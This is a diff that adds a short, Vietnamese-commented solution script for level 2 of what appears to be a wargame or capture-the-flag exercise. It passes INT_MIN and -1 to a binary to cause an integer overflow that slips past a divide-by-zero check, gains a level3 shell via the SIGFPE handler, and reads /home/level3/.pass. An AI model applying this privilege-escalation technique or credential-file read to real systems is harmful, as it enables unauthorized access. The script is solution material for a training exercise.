@@ -1,0 +1,22 @@
+# Level 2 - Payload / Command
+# Lỗ hổng: integer overflow (INT_MIN / -1) bypass check div-by-zero,
+# kích hoạt SIGFPE -> chạy signal handler catcher() -> setresuid + system("/bin/sh")
+
+# 1. Đọc source để xác định logic (đã có level02.c, chỉ owner level2 đọc được)
+cd /levels
+cat level02.c
+
+# 2. (tuỳ chọn) thử input để thấy check chặn chia-cho-0 literal hoạt động đúng
+./level02 10 0
+# -> bị return 1, không có gì xảy ra (vì atoi("0") == 0 -> check chặn)
+
+# 3. Payload thật: gây tràn số thay vì chia cho 0 literal
+#    argv[1] = -2147483648 (INT_MIN)  |  argv[2] = -1
+./level02 -2147483648 -1
+# -> in "WIN!", rớt vào shell mới (quyền level3)
+
+# 4. Xác nhận đã lên quyền level3
+id
+
+# 5. Lấy password cho level 3
+cat /home/level3/.pass
